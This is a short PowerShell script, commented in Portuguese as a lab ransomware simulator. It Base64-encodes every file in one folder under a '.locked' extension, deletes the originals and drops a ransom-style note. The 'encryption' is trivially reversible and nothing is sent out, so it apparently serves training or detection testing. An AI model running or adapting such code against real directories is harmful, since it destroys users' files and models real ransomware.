# Simulador de ransomware (Windows)
# Criptografa arquivos em C:\VulnerableFiles e gera nota de resgate
# Criptografia reversível para laboratório

$TargetDir = "C:\VulnerableFiles"
$KeyFile = "$TargetDir\labkey.txt"
$NoteFile = "$TargetDir\README_RESCUE.txt"
$Ext = ".locked"

if (!(Test-Path $KeyFile)) {
    $Key = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | % {[char]$_})
    Set-Content -Path $KeyFile -Value $Key
} else {
    $Key = Get-Content $KeyFile
}

Get-ChildItem -Path $TargetDir -File | Where-Object { $_.Extension -ne $Ext -and $_.Name -ne "labkey.txt" -and $_.Name -ne "README_RESCUE.txt" } | ForEach-Object {
    $Content = Get-Content $_.FullName -Raw
    $Encrypted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Content + $Key))
    Set-Content -Path ($_.FullName + $Ext) -Value $Encrypted
    Remove-Item $_.FullName
}

Set-Content -Path $NoteFile -Value "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! Para restaurar, use a chave em $KeyFile e o script de restauração."
